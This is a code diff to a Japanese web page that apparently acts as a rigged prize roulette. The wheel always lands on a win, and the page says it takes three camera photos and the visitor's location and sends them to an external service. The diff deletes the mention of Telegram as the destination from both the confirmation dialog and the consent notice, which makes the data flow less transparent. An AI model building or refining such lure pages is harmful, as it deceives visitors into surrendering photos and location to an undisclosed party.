@@ -46,7 +46,7 @@
 
 <div id="confirmModal" class="modal">
   <h1>データ送信の確認</h1>
-  <p>写真3枚と位置情報を取得しました。<br>これらをTelegramへ送信しますか？</p>
+  <p>これらを送信しますか？</p>
   <div class="btn-group">
     <button class="primary-btn" id="sendYes">はい（送信する）</button>
     <button class="secondary-btn" id="sendNo">いいえ（破棄して戻る）</button>
@@ -60,7 +60,7 @@
   本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
   ・端末のカメラを使用した写真の撮影<br>
   ・現在地（位置情報）の取得<br>
-  ・取得されたデータの外部サービス（Telegram）への送信<br><br>
+  ・取得されたデータの外部サービスへの送信<br><br>
   これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
   同意しない場合は、データの取得および送信は行われません。<br><br>
   取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
@@ -195,15 +195,15 @@ spinBtn.onclick = () => {
   const currentMod = totalRotation % 360;
   const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
   const stopAngle = 360 - (targetIdx * segmentAngle) - (segmentAngle / 2) + 270;
-  totalRotation += (360 - currentMod) + 1440 + (stopAngle % 360);
-  canvas.style.transition = "transform 3s cubic-bezier(0.1, 0, 0.2, 1)";
+  totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
+  canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   canvas.style.transform = `rotate(${totalRotation}deg)`;
   setTimeout(() => {
     document.getElementById("result").textContent = "当たり！";
     document.getElementById("overlay").style.display = "block";
     document.getElementById("winModal").style.display = "block";
     spinBtn.disabled = false;
-  }, 3200);
+  }, 4200);
 };
 
 document.getElementById("continueBtn").onclick = () => {
